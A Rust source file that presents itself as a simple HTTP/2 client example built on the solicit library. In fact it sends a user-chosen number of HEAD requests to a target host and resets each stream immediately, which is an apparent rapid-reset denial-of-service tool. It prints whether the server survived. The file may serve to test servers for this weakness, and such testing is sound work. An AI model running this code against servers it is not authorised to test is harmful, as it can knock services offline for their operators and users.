//! An example of usage of the `solicit::client::SimpleClient` API.
//!
//! This is a simple implementation of an HTTP/2 client, built on top of the API of `solicit::http`
//! that performs all IO in the main thread.

extern crate solicit;
extern crate url;

use std::env;
use std::str;
use url::Url;

use solicit::client::SimpleClient;
use solicit::http::client::tls::TlsConnector;
use solicit::http::client::CleartextConnector;
use solicit::http::{HttpResult, Response};

fn fetch<'a>(
    scheme: &'a str,
    host: &'a str,
    port: u16,
    paths: &'a [&'a str],
) -> (HttpResult<Response<'a, 'a>>, Vec<HttpResult<()>>) {
    let connector = match scheme {
        "https" => TlsConnector::with_port(host, port),
        _ => CleartextConnector::with_port(host, port),
    };

    let mut client = SimpleClient::with_connector(connector).unwrap();

    let results = paths
        .iter()
        .map(|path| {
            let stream_id = client.head(b"GET", path.as_bytes())?;
            client.reset(stream_id)
        })
        .collect();
    let err = client.get_response(((paths.len() * 2) - 1) as u32);
    (err, results)
}

fn main() {
    fn print_usage() {
        println!("Usage: client_simple <url> <path> <hits>");
    }

    let args: Vec<String> = env::args().collect();

    if args.len() != 4 {
        println!("Invalid args!");
        print_usage();
        return;
    }

    let url = &args[1];
    let path = &args[2];
    let size = args[3].parse::<i32>().unwrap();

    let url_obj = Url::parse(url).unwrap();

    let mut dups: Vec<&str> = Vec::with_capacity(size as usize);
    for _ in 0..size {
        dups.push(&path);
    }

    let host = url_obj.host_str().unwrap();
    let scheme = url_obj.scheme();
    let port = url_obj.port().unwrap_or(match scheme {
        "https" => 443,
        _ => 80,
    });

    println!("Trying {} fast HEAD/RST frames to {}", size, host);

    let (response, results) = fetch(scheme, &host, port, &dups);
    println!(
        "Sent {} HEAD/RST alright...",
        results.iter().filter(|r| r.is_ok()).count()
    );
    match response {
        Ok(_) => println!("We got to the end ok apparently, that might be bad..."),
        Err(err) => println!("Couldn't get to reset all streams ok: {:?}", err),
    }
}
